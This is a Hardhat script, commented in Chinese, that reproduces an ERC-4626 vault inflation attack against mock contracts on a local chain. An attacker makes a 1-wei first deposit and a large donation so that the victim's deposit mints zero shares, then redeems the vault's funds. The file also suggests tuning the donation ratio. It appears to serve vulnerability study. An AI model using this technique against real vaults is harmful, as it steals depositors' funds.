/**
 * ERC-4626 通胀攻击复现脚本
 * 运行: npm run attack
 */
const hre = require("hardhat");

function fmt(n) {
  return hre.ethers.formatEther(n) + " mUSDC";
}

async function main() {
  const [deployer, attacker, victim] = await hre.ethers.getSigners();

  console.log("=== ERC-4626 通胀攻击复现 ===\n");
  console.log("部署者:", deployer.address);
  console.log("攻击者:", attacker.address);
  console.log("受害者:", victim.address);

  const MockUSDC = await hre.ethers.getContractFactory("MockUSDC");
  const VulnerableVault = await hre.ethers.getContractFactory("VulnerableVault");
  const InflationAttacker = await hre.ethers.getContractFactory("InflationAttacker");

  const usdc = await MockUSDC.deploy();
  await usdc.waitForDeployment();

  const vault = await VulnerableVault.deploy(await usdc.getAddress());
  await vault.waitForDeployment();

  const DONATION = hre.ethers.parseEther("10000");
  const VICTIM_DEPOSIT = hre.ethers.parseEther("9999");
  const SEED = 1n;

  await usdc.mint(attacker.address, DONATION + VICTIM_DEPOSIT + hre.ethers.parseEther("100"));
  await usdc.mint(victim.address, VICTIM_DEPOSIT);

  const attackerContract = await InflationAttacker.deploy(await vault.getAddress());
  await attackerContract.waitForDeployment();

  console.log("\n--- 1. 攻击者：首存 1 wei + 捐赠 10000 mUSDC ---");
  await usdc.connect(attacker).approve(await attackerContract.getAddress(), DONATION + SEED);
  await attackerContract.connect(attacker).setup(SEED, DONATION);

  const supplyAfterSetup = await vault.totalSupply();
  const assetsAfterSetup = await vault.totalAssets();
  console.log("金库份额总量:", supplyAfterSetup.toString());
  console.log("金库总资产:  ", fmt(assetsAfterSetup));

  console.log("\n--- 2. 受害者：存入 9999 mUSDC（无最低份额保护）---");
  const victimSharesBefore = await vault.balanceOf(victim.address);
  await usdc.connect(victim).approve(await vault.getAddress(), VICTIM_DEPOSIT);
  await (await vault.connect(victim).deposit(VICTIM_DEPOSIT, victim.address)).wait();
  const victimSharesAfter = await vault.balanceOf(victim.address);

  console.log("受害者获得份额:", victimSharesAfter.toString());
  console.log("受害者份额变化:", (victimSharesAfter - victimSharesBefore).toString());

  const victimUsdcAfterDeposit = await usdc.balanceOf(victim.address);
  console.log("受害者钱包剩余:", fmt(victimUsdcAfterDeposit));

  console.log("\n--- 3. 攻击者：赎回全部份额 ---");
  const attackerBalBefore = await usdc.balanceOf(attacker.address);
  await attackerContract.connect(attacker).steal();
  const attackerBalAfter = await usdc.balanceOf(attacker.address);

  const profit = attackerBalAfter - attackerBalBefore;
  const vaultRemaining = await usdc.balanceOf(await vault.getAddress());
  const victimCanRedeem = await vault.balanceOf(victim.address);

  console.log("\n=== 攻击结果 ===");
  console.log("攻击者本次赎回获得:", fmt(profit));
  console.log("金库剩余资产:      ", fmt(vaultRemaining));
  console.log("受害者持有份额:    ", victimCanRedeem.toString());
  
  if (victimSharesAfter !== 0n) {
    console.warn("\n[警告] 受害者份额非 0，可微调 DONATION / VICTIM_DEPOSIT 比例");
  }
  if (profit <= 0n) {
    throw new Error("攻击未获利，请检查合约或参数");
  }
}

main().catch((err) => {
  console.error(err);
  process.exitCode = 1;
});
